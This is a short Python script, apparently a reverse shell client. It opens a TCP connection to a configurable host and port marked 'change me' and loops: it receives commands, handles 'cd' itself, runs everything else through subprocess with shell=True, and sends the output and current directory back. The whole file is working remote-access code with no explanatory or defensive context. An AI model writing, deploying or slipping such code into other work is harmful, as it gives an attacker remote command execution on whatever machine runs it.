import socket
import os
import subprocess


host = "127.0.0.1" # change me
port = 80 # change me if you want or need

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    data = client.recv(1024)
    if data[:2].decode("ISO-8859-1") == 'cd':
        try:
            os.chdir(data[3:].decode("ISO-8859-1"))
        except OSError:
            pass
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("ISO-8859-1"), shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "ISO-8859-1")
        client.send(str.encode(output_str + str(os.getcwd()) + '> '))
